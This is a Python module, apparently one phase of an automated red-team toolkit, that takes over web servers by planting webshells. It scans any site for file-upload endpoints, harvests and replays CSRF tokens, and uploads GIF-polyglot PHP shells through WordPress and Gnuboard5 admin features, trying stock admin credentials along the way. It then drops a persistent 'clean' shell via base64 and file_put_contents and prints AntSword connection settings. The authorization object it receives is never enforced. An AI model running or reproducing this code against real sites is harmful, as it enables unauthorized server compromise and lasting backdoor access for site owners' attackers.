"""
Phase 04 — Webshell Acquisition (웹쉘 획득)
=============================================
CMS 무관 범용 웹쉘 획득 자동화.

핵심 원칙:
  "사이트가 뭐든 파일 업로드 있으면 우회하고,
   CSRF 있으면 뚫고, 웹쉘 올리면 AntSword 바로 연결"

적용 순서 (어떤 사이트든 동일):
  1. 업로드 엔드포인트 전수 탐색
  2. CSRF 토큰 자동 탐지·포함 (어떤 구현이든)
  3. GIF polyglot + 다중 확장자 전략 자동 순환
  4. AntSword \\x08\\x08 호환 쉘 (모든 웹쉘에 기본 적용)
  5. 업로드 성공 → GIF 헤더 오염 제거 → 클린쉘 자동 드롭
  6. AntSword 연결 설정 즉시 출력

CMS 감지 시 추가 전략:
  - Gnuboard5: CSRF 이중 토큰(ajax.token.php) + design_set_update.php
  - WordPress: media-upload.php + nonce
  - XE/Rhymix: file_upload.php + xe_key
"""
from __future__ import annotations

import re
import time
import base64
from dataclasses import dataclass, field
from typing import Callable

import requests
import requests.exceptions

from ...tools.webshell_upload import (
    WebshellUploader, UploadResult, UPLOAD_STRATEGIES,
    WEBSHELL_PAYLOADS, make_gif_polyglot, drop_clean_shell,
)
from ...core.authorization import AuthorizationContext, create_auth_context
from ...redteam.session import RedTeamSession


# ─────────────────────────────────────────────────────────────────────────────
# 범용 CSRF 토큰 탐지 및 우회
# ─────────────────────────────────────────────────────────────────────────────

class CsrfDetector:
    """
    어떤 사이트의 어떤 CSRF 구현이든 자동 탐지·취득.

    커버하는 패턴:
      - hidden input: _token, csrf_token, token, _csrf, authenticity_token
      - meta tag: csrf-token, _token
      - Gnuboard5: g5_admin_csrf_token_key + ajax.token.php 일회성 토큰
      - WordPress: _wpnonce
      - Laravel: _token (XSRF-TOKEN 쿠키)
      - Django: csrfmiddlewaretoken
      - Rails: authenticity_token
    """

    HIDDEN_FIELD_PATTERNS = [
        r'<input[^>]+name=["\'](_token|csrf_token|token|_csrf|'
        r'authenticity_token|csrfmiddlewaretoken|_wpnonce|'
        r'g5_admin_csrf_token|nonce_field|verify_token)["\'][^>]*value=["\']([^"\']+)["\']',
        r'<input[^>]+value=["\']([^"\']+)["\'][^>]*name=["\'](_token|csrf_token|token|'
        r'_csrf|authenticity_token|csrfmiddlewaretoken)["\']',
    ]
    META_PATTERNS = [
        r'<meta[^>]+name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)["\']',
        r'<meta[^>]+name=["\']_token["\'][^>]*content=["\']([^"\']+)["\']',
    ]
    JS_PATTERNS = [
        r'["\']?(?:csrf_?token|_token|nonce)["\']?\s*[=:]\s*["\']([a-zA-Z0-9_\-+/=]{20,})["\']',
        r'g5_admin_csrf_token_key\s*=\s*["\']([a-f0-9]{32})["\']',
    ]

    def __init__(self, session: requests.Session):
        self.session = session

    def get_tokens(self, page_url: str) -> dict:
        """
        페이지에서 모든 CSRF 토큰 수집.
        Returns: {field_name: token_value}
        """
        tokens = {}
        try:
            r = self.session.get(page_url, timeout=10)
            html = r.text

            # hidden input 탐색
            for pat in self.HIDDEN_FIELD_PATTERNS:
                for m in re.finditer(pat, html, re.I):
                    groups = [g for g in m.groups() if g]
                    if len(groups) >= 2:
                        name, val = groups[0], groups[1]
                        if len(val) > 5:
                            tokens[name] = val

            # meta tag 탐색
            for pat in self.META_PATTERNS:
                m = re.search(pat, html, re.I)
                if m:
                    tokens["csrf-token"] = m.group(1)

            # JS 변수 탐색
            for pat in self.JS_PATTERNS:
                m = re.search(pat, html, re.I)
                if m:
                    tokens["_js_token"] = m.group(1)

            # 쿠키 기반 (Laravel XSRF-TOKEN)
            for cookie in self.session.cookies:
                if "csrf" in cookie.name.lower() or "xsrf" in cookie.name.lower():
                    tokens[cookie.name] = cookie.value

        except Exception:
            pass

        return tokens

    def get_gnuboard_onetime_token(self, admin_url: str, csrf_key: str, referer: str = "") -> str:
        """Gnuboard5 ajax.token.php 일회성 토큰 — 어떤 URL이든 동작"""
        try:
            r = self.session.post(
                admin_url.rstrip("/") + "/ajax.token.php",
                data={"admin_csrf_token_key": csrf_key},
                headers={
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": referer or admin_url,
                },
                timeout=8,
            )
            return r.json().get("token", "")
        except Exception:
            return ""

    def get_wp_nonce(self, admin_url: str, action: str = "media-form") -> str:
        """WordPress _wpnonce 취득"""
        try:
            r = self.session.get(admin_url + "/media-new.php", timeout=8)
            m = re.search(r'_wpnonce["\']?\s*[=:]\s*["\']([a-f0-9]{10})["\']', r.text)
            return m.group(1) if m else ""
        except Exception:
            return ""


# ─────────────────────────────────────────────────────────────────────────────
# 업로드 엔드포인트 탐색기 (범용)
# ─────────────────────────────────────────────────────────────────────────────

class UploadEndpointFinder:
    """
    어떤 사이트든 파일 업로드 가능한 엔드포인트 자동 탐색.
    관리자 패널 + 에디터 API + 게시판 + 미디어 업로드 포함.
    """

    # (경로, 필드명, 추가 POST 데이터)
    COMMON_ENDPOINTS = [
        # 에디터 (CKEditor, TinyMCE — CMS 무관 자주 사용)
        ("/ckeditor/filemanager/connectors/php/connector.php", "NewFile",
         {"Command": "FileUpload", "Type": "File", "CurrentFolder": "/"}),
        ("/ckeditor/core/filemanager/connectors/php/connector.php", "NewFile", {}),
        ("/plugin/ckeditor/filemanager/connectors/php/connector.php", "NewFile", {}),
        ("/ckeditor/upload.php", "upload", {}),
        ("/tinymce/upload.php", "file", {}),
        ("/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php", "userfile", {}),
        ("/editor/upload.php", "file", {}),
        ("/editor/image_upload.php", "file", {}),
        # 게시판 / 첨부
        ("/bbs/ajax.fileupload.php", "file", {}),
        ("/bbs/upload.php", "file", {}),
        ("/board/upload.php", "file", {}),
        ("/board/write.php", "bf_file", {}),
        # 범용
        ("/upload.php", "file", {}),
        ("/upload/upload.php", "file", {}),
        ("/file_upload.php", "file", {}),
        ("/file/upload.php", "file", {}),
        ("/common/upload.php", "file", {}),
        ("/api/upload", "file", {}),
        ("/api/file/upload", "file", {}),
        # 관리자
        ("/admin/upload.php", "file", {}),
        ("/admin/file_upload.php", "file", {}),
        ("/admin/ajax/upload.php", "file", {}),
        ("/adm/upload.php", "file", {}),
        ("/adm/ajax.fileupload.php", "file", {}),
        # WordPress
        ("/wp-admin/async-upload.php", "async-upload", {"action": "upload-attachment"}),
        ("/wp-admin/media-upload.php", "async-upload", {}),
        # Grnuboard5 디자인 설정
        ("/adm/design_set_update.php", "logo_set[homepage_logo]", {}),
        ("/adm/config_form_update.php", "cf_logo", {}),
        # 쇼핑몰
        ("/shop/upload.php", "file", {}),
        ("/goods/upload.php", "file", {}),
        ("/product/upload.php", "file", {}),
    ]

    def __init__(self, base_url: str, session: requests.Session, timeout: int = 5):
        self.base = base_url.rstrip("/")
        self.session = session
        self.timeout = timeout

    def find_all(self, extra_paths: list[str] | None = None) -> list[tuple]:
        """
        존재하는 업로드 엔드포인트 반환.
        Returns: list of (full_url, field_name, extra_data)
        """
        results = []
        for path, field, extra in self.COMMON_ENDPOINTS:
            url = self.base + path
            try:
                r = self.session.head(url, timeout=self.timeout, allow_redirects=False)
                if r.status_code in (200, 302, 405, 500):
                    results.append((url, field, extra))
                    continue
                r2 = self.session.get(url, timeout=self.timeout)
                if r2.status_code in (200, 405):
                    results.append((url, field, extra))
            except Exception:
                continue
        return results

    def find_from_html(self, html: str, page_url: str) -> list[tuple]:
        """페이지 HTML에서 업로드 폼 추출"""
        results = []
        forms = re.findall(
            r'<form[^>]+enctype=["\']multipart/form-data["\'][^>]*>(.*?)</form>',
            html, re.I | re.S
        )
        for form_html in forms:
            action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', form_html, re.I)
            if not action:
                continue
            action_url = action.group(1)
            if not action_url.startswith("http"):
                action_url = self.base + "/" + action_url.lstrip("/")
            file_field = re.search(
                r'<input[^>]+type=["\']file["\'][^>]*name=["\']([^"\']+)["\']',
                form_html, re.I
            )
            field = file_field.group(1) if file_field else "file"
            results.append((action_url, field, {}))
        return results


# ─────────────────────────────────────────────────────────────────────────────
# 웹쉘 획득 엔진 (완전 범용)
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class WebshellPhaseResult:
    phase: str = "webshell"
    target: str = ""
    cms_type: str = "unknown"
    shell_url: str = ""
    shell_password: str = "ant"
    shell_type: str = ""
    antsword_compatible: bool = False
    antsword_settings: dict = field(default_factory=dict)
    method_used: str = ""
    severity: str = "info"
    error: str = ""


class WebshellPhaseEngine:
    """
    범용 웹쉘 획득 엔진.

    이 클래스의 철학:
      어떤 CMS, 어떤 프레임워크든 파일 업로드 가능한 지점이 있으면
      동일한 전략으로 웹쉘을 올린다.
      CMS별 특수 처리는 추가 전략으로만 동작, 기본 로직은 모두 범용.
    """

    def __init__(
        self,
        target: str,
        auth_ctx: AuthorizationContext,
        session: RedTeamSession | None = None,
        on_log: Callable[[str], None] | None = None,
    ):
        self.target = target.rstrip("/")
        self.auth_ctx = auth_ctx
        self.rt_session = session
        self.log = on_log or print
        self.http = requests.Session()
        self.http.verify = False
        self.http.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        requests.packages.urllib3.disable_warnings()
        self.csrf = CsrfDetector(self.http)
        self.finder = UploadEndpointFinder(self.target, self.http)

    def run(self) -> WebshellPhaseResult:
        result = WebshellPhaseResult(target=self.target)
        self.log("\n[bold red]🐚 Phase 4: WEBSHELL ACQUISITION[/bold red]")

        # exploit phase 세션에서 정보 가져오기
        admin_info = self._get_session_info()
        self.log(f"  이전 단계 정보: admin_login={bool(admin_info.get('admin_login'))}, "
                 f"admin_url={admin_info.get('admin_panel', '')}")

        # CMS 핑거프린팅 (어떤 CMS든 탐지)
        cms_type = self._detect_cms()
        result.cms_type = cms_type
        self.log(f"  CMS: {cms_type}")

        # ── 업로드 엔드포인트 수집 (범용) ──
        self.log("[cyan]  업로드 포인트 탐색 중...[/cyan]")
        candidates = self.finder.find_all()

        # 관리자 패널 기반 추가 탐색
        admin_url = admin_info.get("admin_panel", "")
        if admin_url:
            extra = self.finder.find_from_html(
                self._fetch(admin_url), admin_url
            )
            candidates = extra + candidates  # 관리자 패널 엔드포인트 우선

        self.log(f"  발견된 업로드 포인트: {len(candidates)}개")

        # ── CMS별 추가 전략 우선 시도 ──
        if cms_type == "gnuboard5":
            success = self._cms_gnuboard5(result, admin_info)
            if success:
                return self._finalize(result)

        if "wordpress" in cms_type:
            success = self._cms_wordpress(result, admin_info)
            if success:
                return self._finalize(result)

        # ── 범용 전략: 모든 엔드포인트 × 모든 우회 전략 ──
        success = self._universal_upload(result, candidates)
        if success:
            return self._finalize(result)

        result.error = "모든 업로드 전략 실패"
        self.log("[yellow]  웹쉘 획득 실패[/yellow]")
        return result

    # ── 범용 업로드 (핵심) ────────────────────────────────────────────
    def _universal_upload(
        self,
        result: WebshellPhaseResult,
        candidates: list[tuple],
    ) -> bool:
        """
        어떤 사이트든 적용:
          각 엔드포인트에 대해 CSRF 자동 포함 + 다중 우회 전략 순환
        """
        for up_url, field_name, base_extra in candidates:
            self.log(f"[dim]  → {up_url} (field={field_name})[/dim]")

            # 1. 해당 페이지/엔드포인트의 CSRF 토큰 자동 수집
            csrf_tokens = self.csrf.get_tokens(up_url)
            # 폼 페이지 URL도 시도 (action != form URL인 경우)
            ref_page = up_url.rsplit("_update", 1)[0] if "_update" in up_url else up_url
            if ref_page != up_url:
                csrf_tokens.update(self.csrf.get_tokens(ref_page))

            # 2. extra_data에 CSRF 토큰 병합
            extra = {**base_extra}
            for k, v in csrf_tokens.items():
                if k not in ("_js_token",):
                    extra[k] = v

            # 3. WebshellUploader로 모든 우회 전략 자동 시도
            uploader = WebshellUploader(
                upload_url=up_url,
                field_name=field_name,
                http_session=self.http,
                extra_data=extra,
                on_log=self.log,
            )
            res = uploader.try_all(base_url=self.target)

            if res.success:
                result.shell_url = res.shell_url
                result.shell_password = res.shell_password
                result.shell_type = res.shell_type
                result.antsword_compatible = True
                result.antsword_settings = res.antsword_settings
                result.method_used = f"universal:{res.strategy}@{up_url}"
                result.severity = "critical"

                # 4. GIF 헤더 오염 시 클린쉘 자동 드롭
                if "gif" in res.strategy or "png" in res.strategy or "jpg" in res.strategy:
                    self._drop_clean_shell(result)

                return True

        return False

    # ── CMS별 추가 전략 ───────────────────────────────────────────────
    def _cms_gnuboard5(self, result: WebshellPhaseResult, admin_info: dict) -> bool:
        """
        Gnuboard5 전용 추가 전략:
          세션키 + ajax.token.php 이중 CSRF 우회 → design_set_update.php 업로드.
        기본 범용 전략으로 안 될 때 추가로 시도.
        """
        self.log("[cyan]  Gnuboard5 전용 체인 시도 (CSRF 이중 토큰)...[/cyan]")
        try:
            from ...tools.gnuboard import (
                GnuboardAdminLogin, GnuboardWebshellUpload, KOREA_ADMIN_CREDS
            )
            admin_path = admin_info.get("admin_panel", "").replace(self.target, "") or "/adm"
            login_engine = GnuboardAdminLogin(self.target, admin_path)

            creds = None
            if admin_info.get("admin_login") and admin_info.get("admin_creds"):
                c = admin_info["admin_creds"]
                creds = [(c.get("id", ""), c.get("pw", ""))] + KOREA_ADMIN_CREDS

            gs = login_engine.login(creds)
            if not gs.logged_in:
                return False

            self.log(f"[green]  ✅ 로그인 성공: {gs.admin_id}/{gs.admin_pw}[/green]")
            uploader = GnuboardWebshellUpload(
                http_session=login_engine.session,
                base_url=self.target,
                admin_url=self.target + admin_path,
                csrf_key=gs.csrf_key,
            )
            ws = uploader.upload_webshell()
            if ws.success:
                result.shell_url = ws.shell_url
                result.shell_password = ws.shell_password
                result.shell_type = ws.shell_type
                result.antsword_settings = {
                    "URL地址": ws.shell_url,
                    "连接密码": ws.shell_password,
                    "编码器": "default",
                    "解码器": "default",
                    "连接类型": "PHP",
                }
                result.method_used = "gnuboard5_design_upload"
                result.severity = "critical"
                return True
        except Exception as e:
            self.log(f"[dim]  Gnuboard5 전용 실패: {e}[/dim]")
        return False

    def _cms_wordpress(self, result: WebshellPhaseResult, admin_info: dict) -> bool:
        """WordPress media upload 전용 전략"""
        self.log("[cyan]  WordPress media upload 시도...[/cyan]")
        try:
            nonce = self.csrf.get_wp_nonce(self.target + "/wp-admin")
            if not nonce:
                return False
            gif_shell = make_gif_polyglot(WEBSHELL_PAYLOADS["antsword_default"])
            files = {"async-upload": ("shell.php", gif_shell, "image/gif")}
            data = {"action": "upload-attachment", "_wpnonce": nonce}
            r = self.http.post(
                self.target + "/wp-admin/async-upload.php",
                files=files, data=data, timeout=15,
            )
            # URL 추출
            m = re.search(r'"url"\s*:\s*"([^"]+\.php)"', r.text)
            if m:
                shell_url = m.group(1)
                test = self.http.post(shell_url, data={"ant": "echo 'WP_OK';"}, timeout=8)
                if "WP_OK" in test.text:
                    result.shell_url = shell_url
                    result.shell_password = "ant"
                    result.method_used = "wordpress_media_upload"
                    result.severity = "critical"
                    self._drop_clean_shell(result)
                    return True
        except Exception as e:
            self.log(f"[dim]  WordPress 전용 실패: {e}[/dim]")
        return False

    # ── 클린쉘 드롭 (범용 — GIF 헤더 오염 제거) ─────────────────────
    def _drop_clean_shell(self, result: WebshellPhaseResult):
        """
        GIF/PNG/JPG polyglot 쉘은 응답 앞에 이미지 헤더 바이트가 붙어
        AntSword가 "返回数据为空" 오류를 냄.
        → 기존 쉘로 순수 PHP 클린쉘을 file_put_contents로 작성.
        이 과정은 어떤 웹쉘에서든 동일하게 적용.
        """
        self.log("[cyan]  클린쉘 드롭 (이미지 헤더 오염 제거)...[/cyan]")

        # 같은 디렉터리에 ant.php 작성
        base_url = result.shell_url.rsplit("/", 1)[0]
        clean_url = base_url + "/ant.php"

        # 서버 경로 heuristic
        for doc_root in ["/var/www/html", "/var/www", "/home/www", "/srv/www/htdocs", "/www"]:
            m = re.search(r'(/data/.+|/upload/.+|/files/.+)', result.shell_url)
            if m:
                server_path = doc_root + m.group(1).rsplit("/", 1)[0] + "/ant.php"
                drop = drop_clean_shell(
                    existing_shell_url=result.shell_url,
                    target_path=server_path,
                    target_url=clean_url,
                    http_session=self.http,
                )
                if drop.success:
                    result.shell_url = clean_url
                    result.shell_type = "clean_php"
                    result.antsword_settings["URL地址"] = clean_url
                    self.log(f"[green]  ✅ 클린쉘 드롭 완료: {clean_url}[/green]")
                    return

        # 경로 추정 실패 시 PHP로 직접 작성
        self._drop_clean_via_eval(result, clean_url)

    def _drop_clean_via_eval(self, result: WebshellPhaseResult, clean_url: str):
        """eval 방식으로 클린쉘 작성 (서버 경로 불명 시)"""
        from ...tools.webshell_upload import WEBSHELL_PAYLOADS
        clean_code = WEBSHELL_PAYLOADS["antsword_default"]
        b64 = base64.b64encode(clean_code.encode()).decode()
        php = (
            f"$f=__DIR__.'/ant.php';"
            f"file_put_contents($f,base64_decode('{b64}'));"
            f"echo file_exists($f)?'OK':'FAIL';"
        )
        try:
            r = self.http.post(result.shell_url, data={"ant": php}, timeout=10)
            if "OK" in r.text:
                test = self.http.post(clean_url, data={"ant": "echo 'C';"}, timeout=5)
                if "C" in test.text:
                    result.shell_url = clean_url
                    result.shell_type = "clean_php"
                    if "URL地址" in result.antsword_settings:
                        result.antsword_settings["URL地址"] = clean_url
                    self.log(f"[green]  ✅ 클린쉘 드롭 완료 (eval): {clean_url}[/green]")
        except Exception:
            pass

    # ── 마무리 / 출력 ─────────────────────────────────────────────────
    def _finalize(self, result: WebshellPhaseResult) -> WebshellPhaseResult:
        """성공 후 AntSword 가이드 출력 + 세션 저장"""
        self.log("\n" + "═"*60)
        self.log("[bold green]🎉 웹쉘 획득 성공![/bold green]")
        self.log("═"*60)
        self.log(f"  URL:       {result.shell_url}")
        self.log(f"  비밀번호:  {result.shell_password}")
        self.log(f"  방법:      {result.method_used}")
        self.log(f"  쉘 타입:   {result.shell_type}")
        self.log("\n[bold]🐜 AntSword 연결 설정:[/bold]")
        settings = result.antsword_settings or {
            "URL地址": result.shell_url,
            "连接密码": result.shell_password,
            "编码器": "default",
            "解码器": "default",
            "连接类型": "PHP",
        }
        for k, v in settings.items():
            if k != "note":
                self.log(f"    {k}: {v}")
        self.log("\n[yellow dim]ℹ AntSword default 인코더는 파라미터에 \\x08\\x08 prefix를"
                 " 붙여 전송하지만 이 쉘은 php://input 파싱으로 자동 처리합니다.[/yellow dim]")
        self.log("═"*60 + "\n")

        if self.rt_session:
            self.rt_session.add_finding(
                "webshell", "WebshellPhaseResult",
                {
                    "shell_url": result.shell_url,
                    "password": result.shell_password,
                    "method": result.method_used,
                    "antsword_settings": settings,
                },
                "critical",
            )
        return result

    # ── 헬퍼 ─────────────────────────────────────────────────────────
    def _detect_cms(self) -> str:
        """빠른 CMS 탐지"""
        try:
            r = self.http.get(self.target, timeout=8)
            body = r.text.lower()
            if any(x in body for x in ["gnuboard", "g5_", "/bbs/board.php"]):
                return "gnuboard5"
            if "wordpress" in body or "/wp-content/" in body:
                return "wordpress"
            if "xe_" in body or "rhymix" in body:
                return "rhymix"
            if "drupal" in body:
                return "drupal"
            if "joomla" in body:
                return "joomla"
        except Exception:
            pass
        return "unknown"

    def _get_session_info(self) -> dict:
        """이전 phase 결과에서 관리자 정보 취득"""
        if not self.rt_session:
            return {}
        for finding in self.rt_session.get_phase_findings("exploit"):
            data = finding.get("data", {})
            if isinstance(data, dict) and (
                data.get("admin_login") or data.get("admin_panel")
            ):
                return data
        return {}

    def _fetch(self, url: str) -> str:
        try:
            return self.http.get(url, timeout=8).text
        except Exception:
            return ""


# ─────────────────────────────────────────────────────────────────────────────
# 파이프라인 진입점
# ─────────────────────────────────────────────────────────────────────────────

def run_phase(
    target: str,
    context: dict,
    session: RedTeamSession | None = None,
) -> dict:
    auth_ctx: AuthorizationContext = context.get("auth_ctx")
    if not auth_ctx:
        auth_ctx = create_auth_context(target)

    engine = WebshellPhaseEngine(
        target=target,
        auth_ctx=auth_ctx,
        session=session,
        on_log=context.get("on_progress") or print,
    )
    result = engine.run()

    return {
        "phase":            "webshell",
        "cms_type":         result.cms_type,
        "shell_url":        result.shell_url or None,
        "shell_password":   result.shell_password,
        "method":           result.method_used,
        "antsword_settings": result.antsword_settings,
        "severity":         result.severity,
        "success":          bool(result.shell_url),
    }
